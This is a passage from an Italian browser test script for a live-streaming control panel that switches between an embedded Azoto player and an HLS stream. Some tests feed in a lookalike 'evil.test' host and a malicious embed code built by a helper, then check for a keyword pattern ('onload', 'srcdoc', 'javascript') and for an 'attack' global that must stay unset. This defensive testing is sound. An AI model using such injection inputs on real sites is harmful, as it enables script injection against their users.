        vero(await testo('#regia-video-attuale') === LINK.live && await testo('#regia-video-tipo-attuale') === '(flusso HLS)' && await testo('#regia-riserva-attuale') === LINK.spento
            && await testo('#regia-sorgente') === 'link principale' && await testo('#regia-sorgente-etichetta') === 'Link scelto per il flusso diretto:',
            'nella parte del flusso diretto: i due link salvati con il loro tipo e il link scelto per quando si passerà al flusso');
        vero(await testo('#btn-sorgente-riserva') === 'Passa alla riserva per tutti' && !(await nascosto('#btn-sorgente-riserva')) && await nascosto('#btn-sorgente-principale'),
            'fuori onda un solo pulsante per la riserva: «Passa alla riserva per tutti»');
        await $('#btn-in-onda').click();
        const domandaOnda = await confermaDialogo(/Mandare in onda.*Si usa il player Azoto \(cdn\.azotosolutions\.com\/…\/player\)\. Chi è collegato lo vede subito/s, 'Vai in onda');
        vero(/previsto per venerdì 2 ottobre 2026, non per oggi/.test(domandaOnda), 'oggi non è il giorno dell\'evento: la conferma lo dice (evento sbagliato nel menu?)');
        await aspetta(async () => await $('#regia-stato').getAttribute('data-stato') === 'in_onda', 5000, 'in onda');
        vero(await testo('#regia-stato-testo') === 'IN ONDA' && await testo('#stato-testata') === 'In onda', 'IN ONDA, grande in regia e in testata');
        vero(await $('#btn-in-onda').isDisabled() && !(await $('#btn-termina').isDisabled()) && !(await $('#btn-pausa').isDisabled()), 'in onda: «Vai in onda» spento, «Termina» e «Pausa» accesi');
        let pub = await docPubblico();
        vero(pub.tipoPlayer === 'azoto' && pub.videoId === AZOTO_29 && pub.videoRiserva === '' && pub.sorgente === 'principale' && pub.videoFirmato === false
            && await aspetta(async () => await testo('#regia-video-pubblico') === 'I partecipanti collegati stanno guardando il player Azoto.', 5000, 'frase della regia').catch(() => false),
            'in onda il servizio pubblica per i partecipanti SOLO l\'indirizzo del player Azoto (videoId), nessun link del flusso, e la regia lo dice', JSON.stringify(pub));
        // «Guarda»: il player Azoto come lo vedono i partecipanti
        await $('#btn-guarda-azoto').click();
        await aspetta(async () => await testo('#msg-azoto') === 'Player Azoto: qui sotto lo vedi come lo vedono i partecipanti, con i comandi di Azoto.', 20000, '«Guarda» sul player Azoto');
        const ifrRegia = await anteprimaAzoto('#regia-azoto-attuale-anteprima');
        vero(ifrRegia.length === 1 && ifrRegia[0].classe === 'player-azoto' && ifrRegia[0].src === AZOTO_29 && ifrRegia[0].libero
            && ifrRegia[0].titolo === 'Diretta: Next Generation Business 2026 · Napoli' && !!(await paginaAzotoIn('#regia-azoto-attuale-anteprima', 'livetv91')),
            '«Guarda» sul player Azoto: l\'anteprima con player-azoto.js, con dentro la pagina del player, come la vedono i partecipanti', JSON.stringify(ifrRegia));
        await fotoVideo('03-regia-azoto-in-onda', '.regia-video-riquadro', '#msg-azoto');
        await segnala(persone.slice(31, 36));
        const primaDelTimer = chiamate('connessi').length;
        await page.clock.fastForward(21000);
        await aspetta(async () => chiamate('connessi').length > primaDelTimer && await testo('#num-connessi') === '36', 10000, 'aggiornamento dei collegati');
        vero(true, 'dopo 20 secondi il contatore si aggiorna da solo (36: cinque persone in più si sono collegate)');

        // il player Azoto in regia: gli indirizzi che non si possono usare, poi il cambio per tutti
        console.log('\n-- il player Azoto in regia, durante la diretta');
        const videoPrimaRegia = chiamate('evento-video').length;
        const provePrimaRegia = chiamate('prova-link').length;
        for (const [valore, atteso] of [
            ['http://cdn.azotosolutions.com/cloudtv/livetv92/player', 'Player Azoto: ' + MSG('https')],
            ['https://cdn.azotosolutions.com.evil.test/cloudtv/livetv92/player', 'Player Azoto: ' + MSG('non-azoto')],
            [codiceMalevolo('https://cattivo.example/player'), 'Player Azoto: ' + MSG('non-azoto')],
            [LINK.live, 'Player Azoto: ' + MSG('e-flusso')],
            [AZOTO_29, 'È già il player salvato: incolla un indirizzo diverso, poi premi «Cambia il player».']
        ]) {
            await scriviLink('regia-azoto', valore);
            await $('#btn-cambia-azoto').click();
            const detto = await aspetta(async () => { const t = await testo('#msg-azoto'); return t === atteso ? t : ''; }, 5000, 'rifiuto in regia').catch(() => testo('#msg-azoto'));
            vero(detto === atteso, 'in regia «Cambia il player» con ' + (valore.length > 70 ? valore.slice(0, 60) + '…' : valore) + ': «' + detto + '»');
        }
        vero(chiamate('evento-video').length === videoPrimaRegia && chiamate('prova-link').length === provePrimaRegia,
            'gli indirizzi che non si possono usare (e lo stesso player già salvato) si fermano subito: niente provato, niente cambiato');
        // un player che non si puo' incorporare: provato e fermato
        await scriviLink('regia-azoto', AZOTO_BLOCCATO);
        await $('#btn-cambia-azoto').click();
        await aspetta(async () => /Non ho cambiato niente\.$/.test(await testo('#msg-azoto')), 30000, 'player bloccato in regia');
        vero(chiamate('evento-video').length === videoPrimaRegia && chiamate('prova-link').length === provePrimaRegia + 1
            && /^Player Azoto: non si può usare\. Il player Azoto non si può incorporare nel nostro sito: il loro server lo vieta \(X-Frame-Options: DENY\)\. Non ho cambiato niente\.$/.test(await testo('#msg-azoto'))
            && (await docPubblico()).videoId === AZOTO_29,
            'un player che il server di Azoto vieta di incorporare, in regia: provato, fermato con il motivo, niente cambiato — «' + await testo('#msg-azoto') + '»');
        // livetv91 -> livetv92, dal codice di Azoto incollato
        const aggiornatoPrimaCambio = (await docPubblico()).videoAggiornato.toMillis();
        r = await scriviLink('regia-azoto', codiceAzoto(AZOTO_30));
        vero(r.tipo.startsWith('Indirizzo del player: ' + AZOTO_30 + ' Preso dal codice di Azoto') && r.tag === 0, 'in regia il codice di Azoto si legge come nella scheda Evento: «' + r.tipo + '»');
        await $('#btn-cambia-azoto').click();
        await confermaDialogo(/^Cambiare il player per tutti\? La diretta è in onda con il player Azoto: chi è collegato passa al nuovo indirizzo da solo, in pochi secondi, senza ricaricare la pagina\. Nuovo player: https:\/\/cdn\.azotosolutions\.com\/cloudtv\/livetv92\/player/s, 'Cambia il player');
        await aspetta(async () => /^Player Azoto cambiato/.test(await testo('#msg-azoto')), 20000, 'player cambiato');
        vero(await testo('#msg-azoto') === 'Player Azoto cambiato: i partecipanti collegati passano al nuovo indirizzo. Dal codice di Azoto ho salvato solo l\'indirizzo del player.',
            '«' + await testo('#msg-azoto') + '»');
        const cambioAzoto = chiamate('evento-video').pop();
        vero(JSON.stringify(Object.keys(cambioAzoto.dati).sort()) === JSON.stringify(['azione', 'azotoUrl', 'idEvento']) && cambioAzoto.dati.azotoUrl === AZOTO_30 && !/[<>]/.test(cambioAzoto.grezzo)
            && chiamate('prova-link').pop().dati.link === AZOTO_30,
            'provato prima (prova-link con il solo indirizzo), poi evento-video riceve SOLO l\'indirizzo nuovo (azotoUrl): niente codice, niente link del flusso', cambioAzoto.grezzo);
        pub = await docPubblico();
        vero(pub.tipoPlayer === 'azoto' && pub.videoId === AZOTO_30 && pub.videoAggiornato.toMillis() > aggiornatoPrimaCambio && (await docRiservato()).azotoUrl === AZOTO_30,
            'sul servizio: livetv91 -> livetv92 per tutti (nel documento dei partecipanti, con videoAggiornato: chi è collegato passa al nuovo player da solo) e nel documento riservato');
        vero(await testo('#regia-azoto-attuale') === AZOTO_30 && await $('#regia-azoto').inputValue() === AZOTO_30 && await testo('#regia-azoto-indirizzo') === 'Player salvato: ' + AZOTO_30,
            'la regia mostra il nuovo player e, nel campo, al posto del codice incollato l\'indirizzo salvato');

        // i link del flusso si possono preparare anche mentre si usa il player Azoto
        console.log('\n-- i link del flusso in regia, mentre si usa il player Azoto');
        // con il player Azoto in uso la parte del flusso diretto e' chiusa: il gestore la apre
        await $('#regia-blocco-flusso > summary').click();
        vero(await aperto('#regia-blocco-flusso') && await $('#regia-video').isVisible() && await $('#regia-video').inputValue() === LINK.live
            && await testo('#regia-flusso-riassunto') === 'webtv.prova.test/…/master.m3u8 + riserva',
            'la parte «Flusso diretto (.m3u8)» si apre con un clic: i campi del flusso, con il link salvato (riassunto: «' + await testo('#regia-flusso-riassunto') + '»)');
        const videoPrimaFlusso = chiamate('evento-video').length;
        const provePrimaFlusso = chiamate('prova-link').length;
        for (const [valore, atteso] of [
            ['http://example.com/diretta/playlist.m3u8', /^Link del flusso: Serve un indirizzo che comincia con https:\/\//],
            ['rtmp://ingest.example.com/live/chiave', /^Link del flusso: Questo è l'indirizzo per trasmettere \(RTMP/],
            [AZOTO_30, new RegExp('^Link del flusso: ' + MSG('e-azoto').replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '$')]
        ]) {
            await scriviLink('regia-video', valore);
            await $('#btn-cambia-video').click();
            const detto = await aspetta(async () => { const t = await testo('#msg-video'); return atteso.test(t) ? t : ''; }, 5000, 'link del flusso rifiutato').catch(() => testo('#msg-video'));
            vero(atteso.test(detto), 'in regia, nel campo del flusso, ' + valore + ': «' + detto + '»');
        }
        vero(chiamate('evento-video').length === videoPrimaFlusso && chiamate('prova-link').length === provePrimaFlusso,
            'link che non si possono usare rifiutati con il motivo, senza provarli e senza cambiare niente');
        // la riserva cambiata mentre si usa il player Azoto: per chi guarda non cambia niente
        await scriviLink('regia-video', LINK.live);
        await scriviLink('regia-riserva', LINK.riserva);
        const pubPrimaRiserva = await docPubblico();
        await $('#btn-cambia-video').click();
        await confermaDialogo(/Cambiare il link di riserva\?.*La diretta è in onda con il player Azoto: chi guarda adesso non vede cambiare niente; i link nuovi valgono quando passerai al flusso diretto\./s, 'Salva la riserva');
        await aspetta(async () => await testo('#msg-video') === 'Link di riserva aggiornato.', 20000, 'riserva cambiata');
        let cv = chiamate('evento-video').pop().dati;
        vero(cv.riservaUrl === LINK.riserva && cv.videoUrl === LINK.live && !('videoId' in cv) && !('azotoUrl' in cv), 'evento-video riceve la nuova riserva (il link principale resta quello, il player Azoto non si tocca)', JSON.stringify(cv));
        const pubDopoRiserva = await docPubblico();
        vero((await docRiservato()).riservaUrl === LINK.riserva && pubDopoRiserva.videoRiserva === '' && pubDopoRiserva.videoId === AZOTO_30
            && pubDopoRiserva.videoAggiornato.toMillis() === pubPrimaRiserva.videoAggiornato.toMillis() && await testo('#regia-riserva-attuale') === LINK.riserva,
            'sul servizio la nuova riserva è nel documento riservato; per chi guarda (player Azoto) non cambia niente: nessun link del flusso nel documento pubblico, videoAggiornato fermo');

        // A -> B: il flusso diretto per tutti
        console.log('\n-- dal player Azoto al flusso diretto e ritorno, in onda');
        const primaDiB = await docPubblico();
        await pausa(20);
        await $('#btn-passa-flusso').click();
        await confermaDialogo(/^Passare al flusso diretto per tutti\? Chi sta guardando passa dal player Azoto al nostro player \(il link \.m3u8\) da solo, in pochi secondi, senza ricaricare la pagina\. Flusso: webtv\.prova\.test\/…\/master\.m3u8/s, 'Passa al flusso diretto');
        await aspetta(async () => await testo('#regia-tipo-player') === 'Flusso diretto', 10000, 'flusso diretto per tutti');
        pub = await docPubblico();
        vero(chiamate('evento-player').pop().dati.tipoPlayer === 'flusso' && pub.tipoPlayer === 'flusso' && pub.videoId === LINK.live && pub.videoRiserva === LINK.riserva
            && pub.sorgente === 'principale' && pub.videoFirmato === false && pub.videoAggiornato.toMillis() > primaDiB.videoAggiornato.toMillis(),
            '«Passa al flusso diretto per tutti»: evento-player { tipoPlayer: flusso }; nel documento dei partecipanti tipoPlayer «flusso» e videoId il link .m3u8 (non più il player di Azoto), con la riserva; videoAggiornato cambia', JSON.stringify(pub));
        vero(await aspetta(async () => await $('#regia-tipo-player').getAttribute('data-tipo') === 'flusso' && !(await nascosto('#btn-passa-azoto')) && await nascosto('#btn-passa-flusso')
            && await aperto('#regia-blocco-flusso') && !(await aperto('#regia-blocco-azoto'))
            && await testo('#msg-player') === 'Flusso diretto in uso per tutti: chi guarda passa da solo, in pochi secondi.'
            && await testo('#regia-video-pubblico') === 'I partecipanti collegati stanno guardando il flusso diretto (link principale).'
            && await testo('#regia-sorgente-etichetta') === 'Link in uso per tutti:', 5000, 'regia sul flusso diretto').catch(() => false),
            'la regia lo mostra: «Flusso diretto», ora c\'è «Torna al player Azoto per tutti», si apre la parte del flusso e si chiude quella di Azoto');
        // la riconferma (un altro gestore, o la stessa regia): la modalita' resta, videoAggiornato cambia comunque
        const primaRiconferma = pub.videoAggiornato.toMillis();
        await pausa(20);
        const riconferma = await api('diretta-gestione', { azione: 'evento-player', idEvento: ID, tipoPlayer: 'flusso' }, tokGestore);
        pub = await docPubblico();
        vero(riconferma.stato === 200 && pub.tipoPlayer === 'flusso' && pub.videoId === LINK.live && pub.videoAggiornato.toMillis() > primaRiconferma,
            'la riconferma (evento-player con il flusso già in uso): tipoPlayer resta «flusso», videoAggiornato cambia comunque (riporta sul flusso anche chi era rimasto indietro)');
        // il flusso in uso per tutti non si toglie
        const videoPrimaTogli = chiamate('evento-video').length;
        // togliere il flusso: si svuotano i due campi (la riserva da sola non si puo' tenere)
        await $('#regia-video').fill('');
        await $('#btn-cambia-video').click();
        await aspetta(async () => /^Il link di riserva serve insieme al link del flusso/.test(await testo('#msg-video')), 5000, 'riserva senza principale');
        await $('#regia-riserva').fill('');
        await $('#btn-cambia-video').click();
        await aspetta(async () => /^Il flusso diretto è in uso per tutti: per togliere il link \.m3u8 torna prima al player Azoto/.test(await testo('#msg-video')), 5000, 'flusso in uso');
        vero(chiamate('evento-video').length === videoPrimaTogli && await $('#regia-video').getAttribute('aria-invalid') === 'true',
            'il flusso in uso per tutti non si toglie dalla regia (svuotati il link e la riserva): «' + await testo('#msg-video') + '»');
        const toglie = await api('diretta-gestione', { azione: 'evento-video', idEvento: ID, videoUrl: '' }, tokGestore);
        const toglieDaEvento = await api('diretta-gestione', { azione: 'evento-salva', evento: { id: ID, videoUrl: '' } }, tokGestore);
        vero(toglie.stato === 400 && toglie.dati.codice === 'video' && /^Il flusso diretto è in uso per tutti/.test(toglie.dati.msg) && toglieDaEvento.stato === 400 && toglieDaEvento.dati.codice === 'video'
            && (await docRiservato()).videoId === LINK.live && (await docPubblico()).videoId === LINK.live,
            'né chiamando il servizio a mano (evento-video ed evento-salva: 400, «' + toglie.dati.msg + '»): il flusso resta');
        await scriviLink('regia-video', LINK.live);
        await scriviLink('regia-riserva', LINK.riserva);

        // in modalita' B: la riserva per tutti, e ritorno
        const aggiornatoPrima = (await docPubblico()).videoAggiornato.toMillis();
        await $('#btn-sorgente-riserva').click();
        await confermaDialogo(/Passare alla riserva per tutti\?.*passa da solo al link di riserva in pochi secondi/s, 'Passa alla riserva');
        await aspetta(async () => await testo('#regia-sorgente') === 'link di riserva', 10000, 'riserva per tutti');
        pub = await docPubblico();
        vero(chiamate('evento-sorgente').pop().dati.sorgente === 'riserva' && pub.sorgente === 'riserva' && pub.videoAggiornato.toMillis() > aggiornatoPrima,
            '«Passa alla riserva per tutti»: evento-sorgente, e nel documento dei partecipanti sorgente «riserva» (videoAggiornato cambia)');
        vero(await aspetta(async () => await $('#regia-sorgente').getAttribute('data-sorgente') === 'riserva' && await $('.link-salvato[data-ruolo="riserva"]').getAttribute('data-in-uso') === 'si'
            && await testo('#btn-sorgente-principale') === 'Torna al link principale per tutti' && await testo('#btn-sorgente-riserva') === 'Riporta tutti sulla riserva'
            && /Riserva in uso per tutti/.test(await testo('#msg-sorgente')), 5000, 'regia sulla riserva').catch(() => false),
            'la regia lo mostra: bollino «link di riserva», riga della riserva «in uso», «Torna al link principale per tutti» (e «Riporta tutti sulla riserva»)');
        // «Guarda»: la riserva come la vedono i partecipanti
        await $('#btn-guarda-riserva').click();
        await aspetta(async () => /Link di riserva: qui sotto lo vedi come lo vedono i partecipanti/.test(await testo('#msg-sorgente')), 25000, 'guarda la riserva');
        vero(await $('#regia-attuale-anteprima video').count() === 1 && await videoVa('#regia-attuale-anteprima') && webtv.richieste.some(q => /^\/riserva\/.*\.m4s$/.test(q)),
            '«Guarda» sulla riserva: l\'anteprima con il player dei partecipanti legge i segmenti di /riserva/ e il video va');
        await fotoVideo('04-regia-flusso-in-onda', '.regia-video-riquadro', '#msg-sorgente');
        // «Torna al link principale per tutti»
        await $('#btn-sorgente-principale').click();
        await confermaDialogo(/Tornare al link principale per tutti\?/, 'Torna al principale');
        await aspetta(async () => await testo('#regia-sorgente') === 'link principale', 10000, 'principale per tutti');
        pub = await docPubblico();
        vero(chiamate('evento-sorgente').pop().dati.sorgente === 'principale' && pub.sorgente === 'principale'
            && await aspetta(async () => await testo('#btn-sorgente-riserva') === 'Passa alla riserva per tutti' && await testo('#btn-sorgente-principale') === 'Riporta tutti sul link principale', 5000, 'pulsanti').catch(() => false),
            '«Torna al link principale per tutti»: sorgente di nuovo «principale» per tutti');
        // di nuovo sul principale, per chi ci era passato da solo: la regia "riconferma"
        const aggiornatoRiconferma = pub.videoAggiornato.toMillis();
        await pausa(20);
        await $('#btn-sorgente-principale').click();
        await confermaDialogo(/Riportare tutti sul link principale\?.*Chi è passato da solo alla riserva.*torna al principale/s, 'Riporta tutti sul principale');
        await aspetta(async () => /Link principale confermato per tutti/.test(await testo('#msg-sorgente')), 10000, 'riconferma del principale');
        pub = await docPubblico();
        vero(pub.sorgente === 'principale' && pub.videoAggiornato.toMillis() > aggiornatoRiconferma,
            '«Riporta tutti sul link principale» con la regia già sul principale: il servizio aggiorna comunque videoAggiornato (chi era passato da solo alla riserva torna al principale)');

        // un link del flusso nuovo che funziona: provato e poi cambiato per tutti
        await scriviLink('regia-video', LINK.canale2);
        await $('#btn-cambia-video').click();
        await confermaDialogo(/Cambiare il link per tutti\?.*chi è collegato passa al nuovo link da solo/s, 'Cambia il link');
        await aspetta(async () => await testo('#msg-video') === 'Link del flusso aggiornato: i partecipanti collegati passano al nuovo link.', 20000, 'link cambiato');
        cv = chiamate('evento-video').pop().dati;
        vero(cv.videoId === LINK.canale2 && cv.videoUrl === LINK.canale2 && !('riservaUrl' in cv) && !('azotoUrl' in cv), 'evento-video riceve videoUrl e videoId (la riserva e il player Azoto, non cambiati, non si mandano)', JSON.stringify(cv));
        vero((await docPubblico()).videoId === LINK.canale2 && await testo('#regia-video-attuale') === LINK.canale2,
            'sul servizio: chi è collegato passa subito al nuovo link (documento pubblico aggiornato), e la regia lo mostra');
        vero(await $('#regia-video-anteprima video').count() === 1 && /Si può usare/.test(await testo('#regia-video-esito')),
            'il link provato prima di cambiarlo: «Si può usare», con l\'anteprima del player dei partecipanti sotto il campo');
        // avviso a tutti
        await $('#regia-avviso').fill('Problema tecnico: torniamo tra 5 minuti');
        await $('#btn-avviso').click();
        await confermaDialogo(/Pubblicare l'avviso/);
        await aspetta(async () => /torniamo tra 5 minuti/.test(await testo('#regia-avviso-attuale')), 5000, 'avviso');
        vero((await docPubblico()).avviso === 'Problema tecnico: torniamo tra 5 minuti', 'avviso a tutti pubblicato (evento-avviso, nel documento che i partecipanti ascoltano)');
        // pausa con orario di ripresa e ripresa
        await $('#regia-ripresa').fill('14:30');
        await $('#btn-pausa').click();
        await confermaDialogo(/Mettere in pausa.*14\.30/s);
        await aspetta(async () => await $('#regia-stato').getAttribute('data-stato') === 'pausa', 5000, 'pausa');
        vero(await testo('#regia-stato-testo') === 'IN PAUSA' && /si riprende alle 14\.30/.test(await testo('#regia-orari')) && await $('#btn-riprendi').isVisible(), 'pausa: IN PAUSA, orario di ripresa, pulsante «Riprendi»');
        const inPausa = await docPubblico();
        vero(chiamate('evento-stato').pop().dati.ripresa === '14:30' && inPausa.stato === 'pausa' && inPausa.ripresa === '14:30' && inPausa.videoId === '' && inPausa.videoRiserva === ''
            && inPausa.tipoPlayer === 'flusso',
            'evento-stato {stato: pausa, ripresa: 14:30}: in pausa i link spariscono anche dal documento dei partecipanti (R7); la modalità (flusso) resta');
        await $('#btn-riprendi').click();
        await confermaDialogo(/Riprendere la diretta/);
        await aspetta(async () => await $('#regia-stato').getAttribute('data-stato') === 'in_onda', 5000, 'ripresa');
        pub = await docPubblico();
        vero(pub.videoId === LINK.canale2 && pub.videoRiserva === LINK.riserva && pub.tipoPlayer === 'flusso', 'ripresa: di nuovo IN ONDA, con i due link del flusso');

        // B -> A: di nuovo il player Azoto per tutti (quello cambiato in diretta)
        const primaDiA = await docPubblico();
        await pausa(20);
        await $('#btn-passa-azoto').click();
        await confermaDialogo(/^Tornare al player Azoto per tutti\? Chi sta guardando torna dal flusso diretto al player Azoto da solo, in pochi secondi, senza ricaricare la pagina\. Player Azoto: https:\/\/cdn\.azotosolutions\.com\/cloudtv\/livetv92\/player/s, 'Torna al player Azoto');
        await aspetta(async () => await testo('#regia-tipo-player') === 'Player Azoto', 10000, 'di nuovo il player Azoto');
        pub = await docPubblico();
        vero(chiamate('evento-player').pop().dati.tipoPlayer === 'azoto' && pub.tipoPlayer === 'azoto' && pub.videoId === AZOTO_30 && pub.videoRiserva === '' && pub.videoFirmato === false
            && pub.videoAggiornato.toMillis() > primaDiA.videoAggiornato.toMillis(),
            '«Torna al player Azoto per tutti»: tipoPlayer «azoto» e videoId di nuovo l\'indirizzo del player (livetv92, quello cambiato in diretta); i link del flusso spariscono dal documento dei partecipanti', JSON.stringify(pub));
        vero(await aspetta(async () => await testo('#msg-player') === 'Player Azoto in uso per tutti: chi guarda passa da solo, in pochi secondi.'
            && await nascosto('#btn-passa-azoto') && !(await nascosto('#btn-passa-flusso')) && await aperto('#regia-blocco-azoto') && !(await aperto('#regia-blocco-flusso'))
            && await testo('#regia-video-pubblico') === 'I partecipanti collegati stanno guardando il player Azoto.', 5000, 'regia di nuovo sul player Azoto').catch(() => false),
            'la regia torna com\'era: «Passa al flusso diretto per tutti», la parte del player Azoto aperta, «I partecipanti collegati stanno guardando il player Azoto.»');
        await fotoVideo('05-regia-azoto-cambiato', '.regia-video-riquadro', '#regia-blocco-azoto');
        // termina: la conferma dice quanti sono collegati; qui si annulla
        await $('#btn-termina').click();
        await $('#dialogo-conferma').waitFor({ state: 'visible' });
        vero(/Terminare la diretta per tutti \(36 collegati\)/.test(await testo('#conferma-titolo')), 'la conferma di «Termina» dice quante persone sono collegate: «' + await testo('#conferma-titolo') + '»');
        vero(await page.evaluate(() => document.activeElement && document.activeElement.id) === 'conferma-annulla', 'per «Termina» il fuoco parte da «Annulla»');
        await page.keyboard.press('Escape');
        await $('#dialogo-conferma').waitFor({ state: 'hidden' });
        vero(await $('#regia-stato').getAttribute('data-stato') === 'in_onda', 'Esc annulla: la diretta resta in onda');

        /* Il video si puo' cambiare anche dalla scheda Evento. Prima: un altro
           gestore (qui una chiamata vera al servizio) cambia il player dalla
           sua regia; in questa pagina il modulo dell'evento e' rimasto aperto
           con il player di prima. Correggere il luogo NON deve rimettere il
           player vecchio. */
        console.log('\n-- il video dalla scheda Evento, in onda');
        const altroGestore = await api('diretta-gestione', { azione: 'evento-video', idEvento: ID, azotoUrl: AZOTO_31 }, tokGestore);
        vero(altroGestore.stato === 200 && (await docPubblico()).videoId === AZOTO_31, 'un altro gestore cambia il player dalla sua regia (livetv93)');
        await page.click('[data-scheda="evento"]');
        vero(await $('#ev-azoto').inputValue() === AZOTO_30, 'qui il modulo dell\'evento mostra ancora il player di prima (nessuno lo ha ricaricato)');
        const salvaPrima = chiamate('evento-salva').length;
        await $('#ev-luogo').fill('Napoli · Hotel Eurostars Excelsior, Sala Posillipo');
        await $('#btn-salva-evento').click();
        await aspetta(async () => /Modifiche salvate/.test(await testo('#msg-evento')), 10000, 'luogo salvato');
        const soloLuogo = chiamate('evento-salva').slice(salvaPrima).pop().dati.evento;
        const [pubblicoDopo, riservatoDopo] = await Promise.all([docPubblico(), docRiservato()]);
        vero(['tipoPlayer', 'azotoUrl', 'videoUrl', 'videoId', 'riservaUrl', 'firma'].every(k => !(k in soloLuogo)) && pubblicoDopo.luogo === 'Napoli · Hotel Eurostars Excelsior, Sala Posillipo',
            'correggendo il luogo il tipo di player, il player Azoto, i link del flusso e la firma non si mandano (non erano stati toccati)', JSON.stringify(soloLuogo));
        vero(pubblicoDopo.videoId === AZOTO_31 && riservatoDopo.azotoUrl === AZOTO_31 && riservatoDopo.videoId === LINK.canale2 && riservatoDopo.riservaUrl === LINK.riserva,
            'e il player dell\'altro gestore resta: nessuno torna al player vecchio');
        vero(await $('#ev-azoto').inputValue() === AZOTO_31, 'dopo il salvataggio il modulo mostra il player attuale');
        // un player nuovo scritto qui si prova come in Regia: se non si puo' usare, niente salvato
        const salvaPrimaErrore = chiamate('evento-salva').length;
        await scriviLink('ev-azoto', AZOTO_BLOCCATO);
        await $('#btn-salva-evento').click();
        await aspetta(async () => /Non ho salvato niente\.$/.test(await testo('#msg-evento')), 30000, 'player bloccato dalla scheda Evento');
        vero(chiamate('evento-salva').length === salvaPrimaErrore && await $('#ev-azoto').getAttribute('aria-invalid') === 'true'
            && /^Player Azoto: non si può usare\. Il player Azoto non si può incorporare/.test(await testo('#msg-evento')) && (await docRiservato()).azotoUrl === AZOTO_31,
            'dalla scheda Evento un player che non si può incorporare si prova, si blocca con il motivo e non si salva — «' + await testo('#msg-evento') + '»');
        // togliere il player in onda: si chiede (e qui si annulla)
        await scriviLink('ev-azoto', '');
        await $('#btn-salva-evento').click();
        await annullaDialogo(/^Togliere il player Azoto\? La diretta è in onda con il player Azoto: togliendolo, i partecipanti vedranno «Il video sta per arrivare» finché non ne inserisci un altro\./s);
        vero(chiamate('evento-salva').length === salvaPrimaErrore && (await docPubblico()).videoId === AZOTO_31, '«Annulla»: il player resta, niente salvato');
        // il codice malevolo, salvato: solo l'indirizzo del player
        await scriviLink('ev-azoto', codiceMalevolo(AZOTO_29));
        await $('#btn-salva-evento').click();
        await confermaDialogo(/^Cambiare il player per tutti\? La diretta è in onda con il player Azoto: chi è collegato passa al nuovo indirizzo da solo/s, 'Cambia il player');
        await aspetta(async () => /Modifiche salvate/.test(await testo('#msg-evento')), 15000, 'player dal codice malevolo');
        vero(await testo('#msg-evento') === 'Modifiche salvate. I partecipanti collegati passano al nuovo player Azoto. Dal codice di Azoto ho salvato solo l\'indirizzo del player.',
            'il codice malevolo salvato dalla scheda Evento, in onda: «' + await testo('#msg-evento') + '»');
        const salvaMalevolo = chiamate('evento-salva').pop();
        vero(salvaMalevolo.dati.evento.azotoUrl === AZOTO_29 && !('tipoPlayer' in salvaMalevolo.dati.evento) && !/[<>]|cattivo|__attacco|onload|onerror|srcdoc|javascript/i.test(salvaMalevolo.grezzo),
            'evento-salva: parte SOLO l\'indirizzo del player (azotoUrl ' + AZOTO_29 + '), niente del resto del codice', salvaMalevolo.grezzo.slice(0, 400));
        const risMalevolo = await docRiservato();
        pub = await docPubblico();
        vero(risMalevolo.azotoUrl === AZOTO_29 && !/[<>]/.test(JSON.stringify(risMalevolo)) && pub.videoId === AZOTO_29 && !/[<>]/.test(JSON.stringify(pub)),
            'sul servizio (firebase-admin): eventiRiservati.azotoUrl = ' + AZOTO_29 + ' e, in onda, lo stesso indirizzo per i partecipanti; nessun HTML da nessuna parte');
        vero(await page.evaluate(() => typeof window.__attacco) === 'undefined' && !tutteLeRichieste.some(u => RE_RICHIESTE_VIETATE.test(u)) && await $('#ev-azoto').inputValue() === AZOTO_29,
            'nessuno script del codice eseguito (window.__attacco undefined), nessuna richiesta verso i suoi siti; nel campo ora c\'è solo l\'indirizzo salvato');
        // il tipo di player dalla scheda Evento, in onda
        const salvaPrimaTipo = chiamate('evento-salva').length;
        await radioFlusso.check();
        vero(await testo('#blocco-flusso .blocco-uso') === 'scelto' && await testo('#blocco-azoto .blocco-uso') === 'non in uso', 'scelto «Flusso diretto (.m3u8)»: il suo riquadro lo dice («scelto»), prima di salvare');
        await $('#btn-salva-evento').click();
        await confermaDialogo(/^Cambiare il tipo di player per tutti\? La diretta è in onda: chi è collegato passa dal player Azoto al flusso diretto da solo, in pochi secondi, senza ricaricare la pagina\./s, 'Passa al flusso diretto');
        await aspetta(async () => await testo('#msg-evento') === 'Modifiche salvate. I partecipanti collegati passano al flusso diretto.', 10000, 'tipo cambiato dalla scheda Evento');
        const soloTipo = chiamate('evento-salva').slice(salvaPrimaTipo).pop().dati.evento;
        pub = await docPubblico();
        vero(soloTipo.tipoPlayer === 'flusso' && ['azotoUrl', 'videoUrl', 'videoId', 'riservaUrl', 'firma'].every(k => !(k in soloTipo))
            && pub.tipoPlayer === 'flusso' && pub.videoId === LINK.canale2 && pub.videoRiserva === LINK.riserva,
            'evento-salva manda solo tipoPlayer, e chi guarda passa al flusso diretto (videoId il link .m3u8, con la riserva)', JSON.stringify(soloTipo));
        vero(await testo('#blocco-flusso .blocco-uso') === 'in uso' && await testo('#blocco-azoto .blocco-uso') === 'non in uso', 'i riquadri dicono quale è in uso');
        // il link del flusso dalla scheda Evento, con il flusso in uso
        await scriviLink('ev-video', LINK.dallEvento);
        await $('#btn-salva-evento').click();
        await confermaDialogo(/Cambiare il link per tutti\?.*La diretta è in onda: chi è collegato passa al nuovo link da solo/s, 'Cambia il link');
        await aspetta(async () => /Modifiche salvate.*I partecipanti collegati ricevono i link nuovi/.test(await testo('#msg-evento')), 15000, 'link cambiato dalla scheda Evento');
        const dallEvento = chiamate('evento-salva').pop().dati.evento;
        vero(dallEvento.videoId === LINK.dallEvento && !('riservaUrl' in dallEvento) && !('azotoUrl' in dallEvento) && !('tipoPlayer' in dallEvento) && (await docPubblico()).videoId === LINK.dallEvento,
            'un link del flusso nuovo dalla scheda Evento: provato, confermato (in onda) e applicato a tutti');
        vero(await $('#ev-video-anteprima').isVisible() && (await $('#ev-video-anteprima video').count()) === 1,
            'l\'anteprima del nuovo link compare sotto il campo, con il player dei partecipanti');
        await page.click('[data-scheda="regia"]');
        vero(await testo('#regia-video-attuale') === LINK.dallEvento && await testo('#regia-tipo-player') === 'Flusso diretto' && await $('#ev-video-anteprima').isHidden(),
            'la regia mostra il flusso diretto in uso e il link appena scelto; l\'anteprima della scheda Evento si chiude cambiando scheda');
        // vedi come un partecipante
        const [nuovaScheda] = await Promise.all([context.waitForEvent('page'), $('#btn-anteprima').click()]);
        await nuovaScheda.waitForLoadState('domcontentloaded').catch(() => {});
